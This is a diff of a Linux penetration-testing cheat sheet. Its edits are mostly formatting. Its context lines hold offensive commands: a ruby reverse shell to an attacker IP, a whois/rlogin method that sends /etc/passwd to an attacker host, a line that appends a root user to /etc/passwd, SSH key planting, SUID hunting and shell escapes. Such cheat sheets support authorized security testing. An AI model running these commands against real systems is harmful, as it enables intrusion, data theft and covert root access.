@@ -7,7 +7,7 @@ gcc test.c -o test                              Compile test
 gcc -m32 test.c -o test                         Compile 32-bit code on a 64-bit box
 chmod 755 test                                  Make the file executable
 ./test                                          Run the file
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Compression
 
@@ -22,7 +22,7 @@ tar -zcvf test.tar test                         Compress
 gzip test
 zip -9 test.zip test
 zip -r test.zip test/
------------------------------------------------------------------------------------------------------- 
+------------------------------------------------------------------------------------------------------------------------------------------------------ 
 
 # Copy Files (remotely)
  
@@ -32,12 +32,12 @@ scp -r user@targetIP:/path/to/share /local/share             Remote to local
 # Append File (remotely)
 
 cat ~/.ssh/id_rsa.pub | ssh user@targetIP 'cat >> .ssh/authorized_keys'
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Date & Time
 
 timedatectl set-timezone EST                    Set the timezone to Eastern Standard Time
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # File Permissions
  
@@ -49,13 +49,13 @@ write   (w)	 2
 execute (e)	 1
  
 chmod 755 test.sh                               Make a file executable
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # File System
 
 /etc/passwd                                     User accounts
 /etc/shadow                                     Encrypted passwords
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
  
 # Files & Directories
  
@@ -73,7 +73,7 @@ mkdir -p tmp/{red,white,blue}                   Create a directory with 3 subdir
 
 cat tmp                                         Show the contents of a file
 more tmp                                        Show the contents of a file, a page at a time
-                                                Space bar for the next page, or 'q' to quit
+                                                Space bar for the next page or 'q' to quit
 
 head tmp                                        Show the first 10 lines of tmp
 head -20 tmp                                    Show the first 20 lines of tmp
@@ -92,14 +92,14 @@ rm tmp                                          Delete a file
 rm -rf test                                     Force delete the directory
 
 ln -s /path/to/file /path/to/link               Create a symbolic link
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # File Integrity
 
 md5sum test.iso                                 MD5 hash
 sha1sum test.iso                                SHA1 hash
 sha256sum test.iso                              SHA256 hash
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Finding Files
 
@@ -113,7 +113,7 @@ find / -name *pass                              Find all the files that end with
 
 find / -user <user> 2>/dev/null                 All files owned by a particular user
 find / -group <group> 2>/dev/null               All files owned by a particular group
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Installation
  
@@ -129,12 +129,12 @@ dpkg-query -l                                   Installed packages
 pip install -r requirements.txt                 Install required Python 2 packages listed in a file
 pip3 install -r requirements.txt                Install required Python 3 packages listed in a file
 --proxy user:passwd@proxy.server:port           Append to previous pip commands when using a proxy
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Networking
 
 dhclient                                        Request an IP address from the DHCP server
-netstat -antpu                                  Listening ports, services, and PIDs
+netstat -antpu                                  Listening ports, services and PIDs
 route                                           Gateway
 /etc/hostname                                   Hostname
 /etc/network/interfaces                         Network interfaces
@@ -167,7 +167,7 @@ broadcast 10.0.3.255
 gateway 10.0.3.1
 
 /etc/init.d/networking restart                  Restart networking
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Privilege Escalation
 
@@ -229,7 +229,7 @@ try:
 except:
      sys.exit()
 
-- Check for binaries with the SUID, SGID, and sticky bit set
+- Check for binaries with the SUID, SGID and sticky bit set
 find / -perm -4000 2>/dev/null                       SUID - run the file with permissions of its owner
 find / -user root -perm -6000 -print 2>/dev/null     SGID - run the file with permissions of the owner's group
 find / -perm -1000 2>/dev/null                       sticky - only the owner of a directory or a file can delete or rename
@@ -259,17 +259,17 @@ ls -l /etc/cron*                                Scheduled cron jobs
 What files are owned by a particular user, but are not present in their home directory?
 What are the files present in the /home/user folder? Are there any hidden files and folders?
 What groups does the user belong to?
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Processes
 
-ps faux                                         All running processes
+ps faux                                         Show all running processes
 ps -ef | grep root                              Processes running as root
 ps -ef | grep -v root                           Processes running under another account besides root
-top                                             Running processes, CPU, and memory
+top                                             Running processes, CPU and memory
 kill -9 <PID>                                   Kill process ID
 killall <service>                               Kill all processes named service
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Proxy
 
@@ -278,7 +278,7 @@ git config --global http.proxy http://proxy:port
 Add to bottom of /root/.bashrc
 export http_proxy=http://username:password@proxy:port
 export https_proxy=https://username:password@proxy:port
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Redirecting
 
@@ -293,12 +293,12 @@ iptables -t nat -A POSTROUTING -j MASQUERADE
 iptables -I FORWARD -j ACCEPT
 iptables -P FORWARD ACCEPT
 sysctl net.ipv4.ip_forward=1
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Remote Desktop
 
 rdesktop -u username -p password -g 85% -r disk:share=/root/ 10.0.0.10
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Reverse shells
 
@@ -338,7 +338,7 @@ ruby -rsocket -e'f=TCPSocket.open("10.0.0.10",443).to_i;exec sprintf("/bin/sh -i
 xterm -display 10.0.0.10:1                      target - it will connect back to you on TCP port 6001
 Xnest :1                                        attacker - catch the incoming xterm, start an X-Server
 xhost +targetIP                                 attacker - authorize the target to connect to you
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Screen
 
@@ -352,7 +352,7 @@ exit                                            Exit the session
 
 <ctrl> a esc                                    Use the up and down arrows or mouse to scroll
 esc                                             Exit scrollback mode
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # SSH
 
@@ -388,7 +388,7 @@ ssh user@targetIP -C -D 1080                    -C   Enable compression, good fo
                                                 -D   Create a SOCKS tunnel on the default port
 
 Firefox Preferences > Advanced > Network > Settings > Manual proxy configuration
-Remove everything for HTTP, SSL, and FTP proxies and ports
+Remove everything for HTTP, SSL and FTP proxies and ports
 SOCKS Host: 127.0.0.1   Port: 1080
 Select SOCKS v5 and Remote DNS
 
@@ -401,7 +401,7 @@ service ssh restart
 export DISPLAY=localhost:0.0
 exit
 ssh user@targetIP -Y                            Connect and use X11 forwarding
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Startup Services
 
@@ -409,7 +409,7 @@ update-rc.d -f <service> <add/remove>
 
 update-rc.d networking defaults
 /etc/init.d/networking restart
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # System
 
@@ -429,7 +429,7 @@ reboot                                          Reboot
 set                                             Environmental variables
 uname -a                                        Kernel info
 uptime                                          Current uptime
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Terminal
 
@@ -437,12 +437,12 @@ ctrl + alt + t                                  Open a Terminal
 ctrl + shift + t                                Open a new tab in Terminal
 ctrl + a                                        Go to the beginning of the line
 ctrl + l                                        Clear the screen
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # tmux
 
 After you ssh into a box, use tmux. If your connection drops, you can ssh back in, connect to your
-previous tmux session, and pick up where you left off. Great when running long scans or anything that
+previous tmux session and pick up where you left off. Great when running long scans or anything that
 you don't want to start over.
 
 tmux ls                                         List sessions
@@ -462,7 +462,7 @@ ctrl +b z (again)                               Zoom out
 ctrl +b (hold ctrl)                             Use the arrows to resize the pane
 
 ctrl +d                                         Close the pane
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Traffic Capture
 
@@ -474,7 +474,7 @@ tcpdump -lnni eth0 'udp port 53'
 tcpdump -lnni eth0 'tcp port 443'
 tcpdump -lnni eth0 'dst 10.0.0.10 and dst port 443'
 tcpdump -w out.pcap -s 65535  'udp port 53'
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Tunneling VNC over SSH
 
@@ -487,7 +487,7 @@ OS X                                            Applications > VNC Viewer: local
                                                 Enter a password twice, then No
 
 Remote Kali                                     vncserver -kill :1
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Upgrade to a full TTY session
 
@@ -505,7 +505,7 @@ sh                                              /bin/sh
 Within IRB                                      exec "/bin/sh"
 Within vi                                       :!bash
 Within vi                                       :set shell=/bin/bash:shell
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # User Accounts
 
@@ -540,28 +540,31 @@ Use echo and taskset (part of sudoers) to add the new user with root privileges 
 taskset 1 echo 'lee:$1$mark$PL9HIgTDwnE9sG27q2Nrb/:0:0:root/:root:/bin/bash' >>/etc/passwd
 sudo lee
 id
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Video resolution
  
 xrandr                                          Supported resolutions
 xrandr -s <resolution>                          Set resolution
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# vim
+# vi
 
-vim oldfile                                     Open an existing file
-vim newfile                                     Create a new file
+vi oldfile                                      Open an existing file
+vi newfile                                      Create a new file
 
-Modes                                           Command, Insert, Append, and Replace
+Modes                                           Command, Insert, Append and Replace
 
-Command mode
-dd                                              Delete entire line
-gg                                              Top of file
-G                                               End of file
-<esc> u                                         Undo
+- Command mode
 :set number                                     Turn on line numbers
 :set nonumber                                   Turn off line numbers
+dd                                              Delete the current line
+yy                                              Copy the current line
+p                                               Paste the clipboard contents
+<esc> u                                         Undo
+
+gg                                              Top of file
+G                                               End of file
 
 Search
 /                                               Search string
@@ -571,19 +574,19 @@ N                                               Previous string
 Search and replace
 :%s/foo/bar/g                                   Search for foo and replace with bar globally
 
-Insert mode
+- Insert mode
 Position the cursor where the new text should go.
 i
 Enter new text.
 <esc> to return to command mode.
 
-Append mode
+- Append mode
 Position the cursor on the last letter of the line.
 a
 Enter new text. This adds text AFTER the cursor. 
 <esc> to return to command mode.
 
-Replace mode
+- Replace mode
 Move the cursor to the character to be replaced.
 r
 Enter the replacement character.
@@ -604,7 +607,7 @@ Enter the replacement character.
 <esc>                                           Write changes and quit
 :wq
 <return>
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # whois Data Exfil
 
@@ -613,7 +616,7 @@ whois -h <attacker IP> -p 43 `cat /etc/passwd | base64`     Target
 
 - additional method
 rlogin -l "$(cat /etc/passwd)" -p port <target IP>
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Anonymous Mountable CIFS
 
@@ -623,7 +626,7 @@ mount -t cifs -o username=user,domain=foo //<target IP>/share /mnt/cifs
 OS X: mount -t cifs //<target IP>:Users/<user> /mnt/cifs/ -o user=<user>,pass=<password>,nounix,sec=ntlmssp
 
 cat /root/.ssh/id_rsa.pub >> /tmp/mount/root/.ssh/authorized_keys
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Anonymous Mountable NFS
 
@@ -632,7 +635,7 @@ showmount -e <target IP>
 apt-get install nfs-common
 mkdir /mnt/temp/
 mount -t nfs -o nolock <target IP>:/<share> /mnt/temp/
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Anonymous Mountable SMB
 
@@ -645,7 +648,7 @@ smb: \> get <file>
 
 mkdir /mnt/temp/
 mount -t cifs //<target IP>/<share> /mnt/temp/ -o user=anonymous
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Rstatd enabled
 
